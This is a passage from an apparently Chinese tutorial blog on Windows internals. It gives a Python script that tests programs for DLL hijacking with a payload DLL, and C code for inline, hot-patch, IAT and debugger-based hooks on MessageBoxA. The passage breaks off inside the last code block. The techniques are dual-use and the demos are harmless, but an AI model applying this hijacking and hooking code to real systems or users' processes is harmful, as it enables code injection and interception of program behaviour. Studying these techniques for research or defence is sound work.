<h3 id="3-2-劫持测试"><a href="#3-2-劫持测试" class="headerlink" title="3.2 劫持测试"></a>3.2 劫持测试</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">def <span class="title function_">test_hijack</span><span class="params">(filename, dlls)</span>:  </span><br><span class="line">    &quot;&quot;&quot;  </span><br><span class="line">    使用恶意DLL进行劫持测试  </span><br><span class="line">    :<span class="keyword">return</span>:  </span><br><span class="line">    &quot;&quot;&quot;    <span class="keyword">for</span> dll in dlls:  </span><br><span class="line">       os.<span class="title function_">rename</span><span class="params">(<span class="string">&#x27;./files/payload32.dll&#x27;</span>, <span class="string">&#x27;./files/&#x27;</span>+dll)</span>  </span><br><span class="line">       proc = psutil.Popen(filename)  </span><br><span class="line">       time.sleep(<span class="number">0.5</span>)  </span><br><span class="line">       <span class="keyword">if</span> os.path.exists(<span class="string">&#x27;./temp_4396&#x27;</span>):  </span><br><span class="line">          print(f<span class="string">&quot;[+] &#123;dll&#125; for &#123;filename&#125; can be hijacked!&quot;</span>)  </span><br><span class="line">          os.remove(<span class="string">&#x27;./temp_4396&#x27;</span>)  </span><br><span class="line">       try:  </span><br><span class="line">          proc.<span class="built_in">terminate</span>()  </span><br><span class="line">       except psutil.NoSuchProcess:  </span><br><span class="line">          print(f<span class="string">&quot;[*] &#123;dll&#125; for &#123;filename&#125; may be hijacked!&quot;</span>)  </span><br><span class="line">       finally:  </span><br><span class="line">          os.rename(<span class="string">&#x27;./files/&#x27;</span>+dll, <span class="string">&#x27;./files/payload32.dll&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>对Windows XP下的notepad.exe进行测试的结果如下：<br><img src="/images/1-1.png" alt="1-1"></p>
<h2 id="4-API-Hook"><a href="#4-API-Hook" class="headerlink" title="4 API Hook"></a>4 API Hook</h2><p>网上对于Hook的分类有很多，上面在DLL注入中已经介绍了消息Hook，所以在这里就只介绍Ring3中的API Hook，即对系统DLL中的API函数进行挂钩。网上也有称之为Inject Hook的，但是我感觉还是API Hook最合适。<br>访问其他进程的最简单方式就是DLL，所以Hook通常也是通过DLL注入实现的。我们在DLL中设置好Hook函数，在DLL加载时就进行挂钩，DLL卸载时进行脱钩就可以实现完整的Hook过程。<br>此部分的代码很多都参考了selph师傅的博客，只实现了32位程序的Hook。</p>
<h3 id="4-1-Inline-Hook"><a href="#4-1-Inline-Hook" class="headerlink" title="4.1 Inline Hook"></a>4.1 Inline Hook</h3><p>修改API函数地址的开头的机器码为JMP跳转指令，如果还需要使用原有的API函数，则需要先Unhook，调用完后再重新Hook。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">BYTE originOpcode[<span class="number">5</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">InstallHook</span><span class="params">(PROC hookAddr)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">UninstallHook</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="type">int</span> WINAPI <span class="title function_">Hook</span><span class="params">(HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType)</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">BOOL WINAPI <span class="title function_">DllMain</span><span class="params">(HMODULE hModule, DWORD  fdwReason, LPVOID lpReserved)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">switch</span> (fdwReason)</span><br><span class="line">	&#123;</span><br><span class="line">	<span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">		InstallHook((PROC)Hook);</span><br><span class="line">		MessageBoxA(<span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="string">&quot;InstallHook!&quot;</span>, MB_OK);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line">		UninstallHook();</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">InstallHook</span><span class="params">(PROC hookAddr)</span></span><br><span class="line">&#123;</span><br><span class="line">	BYTE hookOpcode[<span class="number">5</span>] = &#123; <span class="number">0xE9</span>, <span class="number">0</span> &#125;;</span><br><span class="line">	<span class="comment">//HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, NULL, GetCurrentProcessId());</span></span><br><span class="line">	HANDLE hProcess = GetCurrentProcess();</span><br><span class="line">	<span class="comment">// 1. 获取API函数地址</span></span><br><span class="line">	PROC procAddr = GetProcAddress(GetModuleHandleA(<span class="string">&quot;user32.dll&quot;</span>), <span class="string">&quot;MessageBoxA&quot;</span>);</span><br><span class="line">	<span class="comment">// 2. 修改内存属性</span></span><br><span class="line">	DWORD originFlags = <span class="number">0</span>;</span><br><span class="line">	VirtualProtectEx(hProcess, procAddr, <span class="number">5</span>, PAGE_EXECUTE_READWRITE, &amp;originFlags);</span><br><span class="line">	<span class="comment">// 3. 读取原机器码，保存</span></span><br><span class="line">	ReadProcessMemory(hProcess, procAddr, originOpcode, <span class="number">5</span>, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="comment">// 4. 构造跳转机器码，写入</span></span><br><span class="line">	DWORD jmpAddr = (DWORD)hookAddr - (DWORD)procAddr - <span class="number">5</span>;</span><br><span class="line">	<span class="built_in">memcpy</span>(&amp;hookOpcode[<span class="number">1</span>], &amp;jmpAddr, <span class="number">4</span>);</span><br><span class="line">	WriteProcessMemory(hProcess, procAddr, hookOpcode, <span class="number">5</span>, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="comment">// 5. 恢复内存属性</span></span><br><span class="line">	VirtualProtectEx(hProcess, procAddr, <span class="number">5</span>, originFlags, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">UninstallHook</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, <span class="literal">NULL</span>, GetCurrentProcessId());</span><br><span class="line">	<span class="comment">// 1. 获取API函数地址</span></span><br><span class="line">	PROC procAddr = GetProcAddress(GetModuleHandleA(<span class="string">&quot;user32.dll&quot;</span>), <span class="string">&quot;MessageBoxA&quot;</span>);</span><br><span class="line">	<span class="comment">// 2. 修改内存属性</span></span><br><span class="line">	DWORD origin_flags = <span class="number">0</span>;</span><br><span class="line">	VirtualProtectEx(hProcess, procAddr, <span class="number">5</span>, PAGE_EXECUTE_READWRITE, &amp;origin_flags);</span><br><span class="line">	<span class="comment">// 3. 将原来的机器码写入</span></span><br><span class="line">	WriteProcessMemory(hProcess, procAddr, originOpcode, <span class="number">5</span>, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="comment">// 4. 恢复内存属性</span></span><br><span class="line">	VirtualProtectEx(hProcess, procAddr, <span class="number">5</span>, origin_flags, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> WINAPI <span class="title function_">Hook</span><span class="params">(HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType)</span></span><br><span class="line">&#123;</span><br><span class="line">	UninstallHook();</span><br><span class="line">	MessageBoxA(<span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="string">&quot;Hooked!&quot;</span>, MB_OK);</span><br><span class="line">	InstallHook((PROC)Hook);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="HotFix"><a href="#HotFix" class="headerlink" title="HotFix"></a>HotFix</h4><p>如果想要Hook的API函数的地址前有至少5字节空闲区域可以被利用，则可以在其地址前的5个字节构造JMP指令，在函数地址处构造机器码0xEB, 0xF9跳转到-7字节，即函数前5字节JMP指令，那么正常的API调用就会跳转到JMP指令上。如果我们需要使用原有的API函数，只需要调用函数地址+2就可以了。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">BYTE originOpcode[<span class="number">7</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">InstallHook</span><span class="params">(PROC hookAddr)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">UninstallHook</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="type">int</span> WINAPI <span class="title function_">Hook</span><span class="params">(HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType)</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">BOOL WINAPI <span class="title function_">DllMain</span><span class="params">(HMODULE hModule, DWORD  fdwReason, LPVOID lpReserved)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">switch</span> (fdwReason)</span><br><span class="line">	&#123;</span><br><span class="line">	<span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">		InstallHook((PROC)Hook);</span><br><span class="line">		MessageBoxA(<span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="string">&quot;InstallHook!&quot;</span>, MB_OK);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line">		UninstallHook();</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">InstallHook</span><span class="params">(PROC hookAddr)</span></span><br><span class="line">&#123;</span><br><span class="line">	BYTE hookOpcode[<span class="number">7</span>] = &#123; <span class="number">0xE9</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0xEB</span>, <span class="number">0xF9</span> &#125;;</span><br><span class="line">	HANDLE hProcess = GetCurrentProcess();</span><br><span class="line">	<span class="comment">// 1. 获取API函数地址, 计算Hook的起始地址</span></span><br><span class="line">	PROC procAddr = GetProcAddress(GetModuleHandleA(<span class="string">&quot;user32.dll&quot;</span>), <span class="string">&quot;MessageBoxA&quot;</span>);</span><br><span class="line">	PBYTE beginAddr = (PBYTE)procAddr - <span class="number">5</span>;</span><br><span class="line">	<span class="comment">// 2. 读取原来的机器码</span></span><br><span class="line">	DWORD originFlags = <span class="number">0</span>;</span><br><span class="line">	VirtualProtectEx(hProcess, beginAddr, <span class="number">7</span>, PAGE_EXECUTE_READWRITE, &amp;originFlags);</span><br><span class="line">	ReadProcessMemory(hProcess, beginAddr, originOpcode, <span class="number">7</span>, <span class="literal">NULL</span>);</span><br><span class="line">	DWORD jmpAddr = (DWORD)hookAddr - (DWORD)procAddr; <span class="comment">// 此处加5减5正好抵消了</span></span><br><span class="line">	<span class="comment">// 3. 构造跳转机器码，写入</span></span><br><span class="line">	<span class="built_in">memcpy</span>(&amp;hookOpcode[<span class="number">1</span>], &amp;jmpAddr, <span class="number">4</span>);</span><br><span class="line">	WriteProcessMemory(hProcess, beginAddr, hookOpcode, <span class="number">7</span>, <span class="literal">NULL</span>);</span><br><span class="line">	VirtualProtectEx(hProcess, procAddr, <span class="number">7</span>, originFlags, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">UninstallHook</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	HANDLE hProcess = GetCurrentProcess();</span><br><span class="line">	PROC procAddr = GetProcAddress(GetModuleHandleA(<span class="string">&quot;user32.dll&quot;</span>), <span class="string">&quot;MessageBoxA&quot;</span>);</span><br><span class="line">	PBYTE beginAddr = (PBYTE)procAddr - <span class="number">5</span>;</span><br><span class="line">	DWORD originFlags = <span class="number">0</span>;</span><br><span class="line">	VirtualProtectEx(hProcess, beginAddr, <span class="number">7</span>, PAGE_EXECUTE_READWRITE, &amp;originFlags);</span><br><span class="line">	WriteProcessMemory(hProcess, beginAddr, originOpcode, <span class="number">7</span>, <span class="literal">NULL</span>);</span><br><span class="line">	VirtualProtectEx(hProcess, procAddr, <span class="number">7</span>, originFlags, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> WINAPI <span class="title function_">Hook</span><span class="params">(HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">typedef</span> <span class="title function_">int</span> <span class="params">(WINAPI* MessageBoxA_t)</span><span class="params">(HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType)</span>;</span><br><span class="line">	PROC procAddr = GetProcAddress(GetModuleHandleA(<span class="string">&quot;user32.dll&quot;</span>), <span class="string">&quot;MessageBoxA&quot;</span>);</span><br><span class="line">	PBYTE endAddr = (PBYTE)procAddr + <span class="number">2</span>;</span><br><span class="line">	MessageBoxA_t HookMessageBoxA = (MessageBoxA_t)endAddr;</span><br><span class="line">	HookMessageBoxA(<span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="string">&quot;Hooked!&quot;</span>, MB_OK);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="4-2-IAT-Hook"><a href="#4-2-IAT-Hook" class="headerlink" title="4.2 IAT Hook"></a>4.2 IAT Hook</h3><p>此方法是修改加载到内存中的PE结构中的IAT表，此时IAT表存储的已经是函数的地址了，我们只需要遍历IAT，找到要Hook的DLL中对应的API函数地址然后进行修改即可。此时并不会修改DLL中的IAT，所以原有的API函数依然可以正常使用。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _CRT_SECURE_NO_WARNINGS</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">InstallHook</span><span class="params">(LPCSTR DLLName, PROC procAddr, PROC hookAddr)</span>;</span><br><span class="line"><span class="type">int</span> WINAPI <span class="title function_">Hook</span><span class="params">(HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType)</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">BOOL WINAPI <span class="title function_">DllMain</span><span class="params">(HMODULE hModule, DWORD  fdwReason, LPVOID lpReserved)</span></span><br><span class="line">&#123;</span><br><span class="line">    PROC procAddr = GetProcAddress(GetModuleHandleA(<span class="string">&quot;user32.dll&quot;</span>), <span class="string">&quot;MessageBoxA&quot;</span>);</span><br><span class="line">    PROC hookAddr = (PROC)Hook;</span><br><span class="line">	<span class="keyword">switch</span> (fdwReason)</span><br><span class="line">	&#123;</span><br><span class="line">	<span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">        InstallHook(<span class="string">&quot;user32.dll&quot;</span>, procAddr, hookAddr);</span><br><span class="line">        MessageBoxA(<span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="string">&quot;InstallHook!&quot;</span>, MB_OK);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line">        InstallHook(<span class="string">&quot;user32.dll&quot;</span>, hookAddr, procAddr);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">InstallHook</span><span class="params">(LPCSTR DLLName, PROC procAddr, PROC hookAddr)</span></span><br><span class="line">&#123;</span><br><span class="line">	HMODULE hModule = GetModuleHandle(<span class="literal">NULL</span>);</span><br><span class="line">	<span class="comment">// 解析PE</span></span><br><span class="line">	PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)hModule;</span><br><span class="line">	PIMAGE_NT_HEADERS pNtHeader = (PIMAGE_NT_HEADERS)((SIZE_T)hModule + pDosHeader-&gt;e_lfanew);</span><br><span class="line">	DWORD szImageBase = pNtHeader-&gt;OptionalHeader.ImageBase;</span><br><span class="line">	DWORD szImpRva = (DWORD)pNtHeader-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;</span><br><span class="line">	PIMAGE_IMPORT_DESCRIPTOR pImpDes = (PIMAGE_IMPORT_DESCRIPTOR)(szImageBase + szImpRva);</span><br><span class="line">    <span class="comment">// 变量导入表</span></span><br><span class="line">    <span class="keyword">while</span> (pImpDes-&gt;Name) &#123;</span><br><span class="line">        DWORD szNameAddr = szImageBase + pImpDes-&gt;Name;</span><br><span class="line">        <span class="type">char</span> szName[MAXBYTE] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">        strcpy_s(szName, (<span class="type">char</span>*)szNameAddr);</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">strcmp</span>(_strlwr(szName), DLLName) == <span class="number">0</span>) &#123;</span><br><span class="line"></span><br><span class="line">            PIMAGE_THUNK_DATA pThunk = (PIMAGE_THUNK_DATA)(pImpDes-&gt;FirstThunk + (DWORD)hModule);</span><br><span class="line">            <span class="keyword">while</span> (pThunk-&gt;u1.Function) &#123;</span><br><span class="line">                <span class="keyword">if</span> (pThunk-&gt;u1.Function == (DWORD)procAddr) &#123;</span><br><span class="line">                    <span class="comment">//修改访问权限</span></span><br><span class="line">                    DWORD dwOldProtect;</span><br><span class="line">                    VirtualProtectEx(GetCurrentProcess(), (LPVOID)&amp;pThunk-&gt;u1.Function, <span class="number">8</span>, PAGE_EXECUTE_READWRITE, &amp;dwOldProtect);</span><br><span class="line">                    <span class="comment">//修改IAT</span></span><br><span class="line">                    pThunk-&gt;u1.Function = (DWORD)hookAddr;</span><br><span class="line">                    VirtualProtectEx(GetCurrentProcess(), (LPVOID)&amp;pThunk-&gt;u1.Function, <span class="number">8</span>, dwOldProtect, <span class="literal">NULL</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                pThunk++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        pImpDes++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> WINAPI <span class="title function_">Hook</span><span class="params">(HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType)</span></span><br><span class="line">&#123;</span><br><span class="line">    MessageBoxA(<span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="string">&quot;Hooked!&quot;</span>, MB_OK);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="4-3-Debug-Hook"><a href="#4-3-Debug-Hook" class="headerlink" title="4.3 Debug Hook"></a>4.3 Debug Hook</h3><p>使用Win32 API 实现一个简单的调试器，在API 函数地址处构造INT3断点，中断后调用Hook函数。感觉没啥太大意义。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">CREATE_PROCESS_DEBUG_INFO g_cpdi;</span><br><span class="line">BYTE originOpcode = <span class="number">0</span>;</span><br><span class="line">BYTE intOpcode = <span class="number">0xCC</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">InstallHook</span><span class="params">(PROC procAddr, LPDEBUG_EVENT pde)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">UninstallHook</span><span class="params">(PROC procAddr)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Hook</span><span class="params">(PROC procAddr, LPDEBUG_EVENT pde)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">DebugLoop</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    DebugActiveProcess(<span class="number">27464</span>);</span><br><span class="line">    DebugLoop();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">InstallHook</span><span class="params">(PROC procAddr, LPDEBUG_EVENT pde)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">memcpy</span>(&amp;g_cpdi, &amp;pde-&gt;u.CreateProcessInfo, <span class="keyword">sizeof</span>(CREATE_PROCESS_DEBUG_INFO)); </span><br><span class="line">	ReadProcessMemory(g_cpdi.hProcess, procAddr, &amp;originOpcode, <span class="keyword">sizeof</span>(BYTE), <span class="literal">NULL</span>);</span><br><span class="line">	WriteProcessMemory(g_cpdi.hProcess, procAddr, &amp;intOpcode, <span class="keyword">sizeof</span>(BYTE), <span class="literal">NULL</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;[+] 已添加断点！\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">UninstallHook</span><span class="params">(PROC procAddr)</span></span><br><span class="line">&#123;</span><br><span class="line">	WriteProcessMemory(g_cpdi.hProcess, procAddr, &amp;originOpcode, <span class="keyword">sizeof</span>(BYTE), <span class="literal">NULL</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;[+] 已取消断点！\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">Hook</span><span class="params">(PROC procAddr, LPDEBUG_EVENT pde)</span></span><br><span class="line">&#123;</span><br><span class="line">    PEXCEPTION_RECORD per = 